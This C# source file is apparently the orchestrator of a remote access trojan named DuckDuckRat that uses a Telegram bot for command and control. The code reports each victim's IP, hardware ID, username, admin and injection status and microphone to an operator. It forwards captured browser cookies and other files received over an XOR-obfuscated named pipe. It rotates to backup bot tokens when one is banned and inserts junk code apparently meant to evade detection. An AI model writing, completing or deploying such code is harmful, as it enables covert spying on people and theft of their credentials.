using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using DuckDuckRat;
using System.Collections.Generic;
using System.Diagnostics.CodeAnalysis;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Reflection;
using System.IO.Pipes;
using File = System.IO.File;

namespace DuckDuckRat
{
    public class BotOrchestrator
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_bb8c073b() {
            int val = 76229;
            if (val > 50000) Console.WriteLine("Hash:" + 76229);
        }

        private ITelegramBotClient _botClient;
        private readonly string _adminId;
        private readonly CommandHandler _commandHandler;
        private bool _isRunning = true;
        private HttpClient? _httpClient;
        private CancellationTokenSource _cts = new CancellationTokenSource();

        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(List<UpdateType>))]
        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(UpdateType))]
        public BotOrchestrator(string token, string adminId, HttpClient? client = null)
        {
            _httpClient = client;
            _adminId = adminId;
            
            // Initial initialization
            _botClient = CreateClient(token, client);
            _commandHandler = new CommandHandler(_botClient, _adminId);
            TelegramService.Initialize(token, adminId, client);

            // NativeAOT Hint: preserve generic list of UpdateType
            GC.KeepAlive(new System.Collections.Generic.List<UpdateType>());
        }

        private ITelegramBotClient CreateClient(string token, HttpClient? client)
        {
            var baseUrl = TelegramService.GetBaseUrl();
            if (baseUrl == "https://api.telegram.org/")
            {
                // Let the library use its internal default
                return new TelegramBotClient(token.Trim(), client);
            }
            
            var options = new TelegramBotClientOptions(token.Trim(), baseUrl);
            return new TelegramBotClient(options, client);
        }

        public void ReinitializeBotClient()
        {
            // Trigger rotation in the static service
            TelegramService.RotateToken();
            string? newToken = TelegramService.CurrentToken;
            
            if (string.IsNullOrEmpty(newToken)) return;
            
            _botClient = CreateClient(newToken, _httpClient);
            _commandHandler.UpdateBotClient(_botClient);
            
            Console.WriteLine("[ORCHESTRATOR] Bot client re-initialized with backup token.");
        }

        public async Task StartAsync()
        {
            try 
            {
                Console.WriteLine("[ORCHESTRATOR] Starting services...");
                
                // --- ANTI-GFW MESH INITIALIZATION ---
                _ = await TelegramService.FindBestRoute();
                _ = Task.Run(() => DuckDuckRat.Modules.ProxyModule.AutoRegisterAsync());
                _ = Task.Run(() => StartPipeListener());

                // Startup Report
                _ = Task.Run(async () => {
                    try { await SendStartupReport(); } catch { }
                });

                Console.WriteLine("[ORCHESTRATOR] Telegram Polling active.");

                while (_isRunning)
                {
                    using (var loopCts = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token))
                    {
                        try 
                        {
                            var receiverOptions = new Telegram.Bot.Polling.ReceiverOptions { AllowedUpdates = Array.Empty<UpdateType>() };
                            
                            _botClient.StartReceiving(
                                updateHandler: async (c, u, ct) => {
                                    Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [BOT] Update received: {u.Type}");
                                    await _commandHandler.HandleUpdateAsync(c, u, ct);
                                },
                                pollingErrorHandler: async (c, ex, ct) => {
                                    Console.WriteLine($"[POLLING ERROR] {ex.Message}");
                                    
                                    // If token is banned or unauthorized, rotate it!
                                    if (ex.Message.Contains("401") || ex.Message.Contains("403") || ex.Message.Contains("Unauthorized"))
                                    {
                                        Console.WriteLine("[!] Token invalidated. Rotating to backup...");
                                        ReinitializeBotClient();
                                        loopCts.Cancel(); // Force polling loop restart
                                    }
                                    else {
                                        await _commandHandler.HandlePollingErrorAsync(c, ex, ct);
                                        await Task.Delay(2000, ct); // Prevent rapid-fire spam
                                    }
                                },
                                receiverOptions: receiverOptions,
                                cancellationToken: loopCts.Token
                            );

                            // Keep the loop alive while the token is valid
                            while (!loopCts.IsCancellationRequested && _isRunning)
                            {
                                await Task.Delay(1000, loopCts.Token);
                            }
                        }
                        catch (OperationCanceledException) { /* Failover triggered */ }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[LOOP ERROR] {ex.Message}. Restarting...");
                            await Task.Delay(3000);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[CRITICAL ERROR] {ex.Message}");
            }
        }

        private async Task SendStartupReport()
        {
            try 
            {
                var (ip, country, flag) = DuckDuckRat.Modules.SystemInfoModule.GetCountryInfo();
                string hwid = DuckDuckRat.Modules.SystemInfoModule.GetHWID();
                string osName = DuckDuckRat.Modules.SystemInfoModule.GetFriendlyOSName();
                string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
                bool isInjected = Environment.CommandLine.Contains("--injected");
                string adminStatus = DuckDuckRat.ElevationService.IsAdmin() ? (isInjected ? "🔥 АДМИН (Injection V6.11)" : "🟢 АДМИН") : "🟡 Обычный Юзер";
                string micStatus = DuckDuckRat.Modules.SystemInfoModule.HasMicrophone() ? "✅" : "❌";

                string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n" +
                              $"━━━━━━━━━━━━━━━━━━\n" +
                              $"👤 <b>ID:</b> <code>{pcUser}</code>\n" +
                              $"🆔 <b>HWID:</b> <code>{hwid}</code>\n" +
                              $"🌐 <b>IP:</b> <code>{ip}</code> | {flag} {country}\n" +
                              $"🖥️ <b>Система:</b> <code>{osName}</code>\n" +
                              $"⚡ <b>Статус:</b> <code>{adminStatus}</code>\n" +
                              $"🎤 <b>Микрофон:</b> {micStatus}\n" +
                              $"🕙 <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
                              $"━━━━━━━━━━━━━━━━━━";
                
                string adminPanelMarkup = "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}";
                string mediaId = "BQACAgIAAyEFAATT7RxjAAIZCmnGmAABk8Djic8lEYfCeNB9VIYdXAACWYwAAhH4MEqw1eoXV0S-xjoE";
                
                await TelegramService.SendAnimation(mediaId, info, adminPanelMarkup);
                
                // Cleanup old logs if they exist (Post-rebrand hygiene)
                try { if (File.Exists("svc_debug.log")) File.Delete("svc_debug.log"); } catch { }
            }
            catch { }
        }

        private async Task StartPipeListener()
        {
            while (_isRunning)
            {
                try
                {
                    using (var pipeServer = new NamedPipeServerStream("duckduckrat_status_pipe", PipeDirection.In, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous))
                    {
                        await pipeServer.WaitForConnectionAsync();
                        using (var reader = new StreamReader(pipeServer))
                        {
                            string raw = await reader.ReadToEndAsync();
                            string decrypted = DecryptString(raw);
                            if (string.IsNullOrEmpty(decrypted)) decrypted = raw;

                            if (decrypted.StartsWith("FILE:"))
                            {
                                string filePath = decrypted.Substring(5).Trim();
                                if (File.Exists(filePath))
                                {
                                    using var stream = File.OpenRead(filePath);
                                    await _botClient.SendDocumentAsync(
                                        chatId: _adminId,
                                        document: InputFile.FromStream(stream, Path.GetFileName(filePath)),
                                        caption: WrapWithSessionTag($"📦 <b>Cookies Captured:</b> <code>{Path.GetFileName(filePath)}</code>"),
                                        parseMode: ParseMode.Html
                                    );
                                    continue; 
                                }
                            }
                            await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag(decrypted), parseMode: ParseMode.Html);
                        }
                    }
                }
                catch { await Task.Delay(100); }
            }
        }

        private string WrapWithSessionTag(string message)
        {
            return $"{message}\n\n━━━━━━━━━━━━━━━━━━\n👤 <b>Session:</b> <code>{ConfigManager.VictimName}</code>";
        }

        private string DecryptString(string base64Encoded)
        {
            if (string.IsNullOrEmpty(base64Encoded)) return null;
            try {
                byte[] data = Convert.FromBase64String(base64Encoded);
                byte[] salt = Encoding.UTF8.GetBytes("n2xkNQYbZwj8r9fz");
                byte[] xorData = new byte[data.Length];
                for (int i = 0; i < data.Length; i++) xorData[i] = (byte)(data[i] ^ salt[i % salt.Length]);
                return Encoding.UTF8.GetString(xorData);
            } catch { return null; }
        }

        public void Stop() { _isRunning = false; _cts.Cancel(); }
    }
}


